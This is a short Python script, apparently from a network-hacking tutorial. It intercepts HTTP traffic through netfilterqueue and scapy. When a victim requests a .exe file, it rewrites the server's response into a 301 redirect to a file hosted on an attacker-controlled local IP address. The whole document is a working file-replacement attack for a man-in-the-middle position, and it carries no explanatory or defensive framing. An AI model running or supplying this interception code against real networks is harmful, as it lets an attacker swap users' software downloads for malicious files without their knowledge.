#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print("[+] exe Request")
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # print(scapy_packet.show())
                modified_packet = set_load(scapy_packet, "\nHTTP/1.1 301 Moved Permanently\nLocation: http://192.168.43.192/arp_table.PNG\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packets)
queue.run()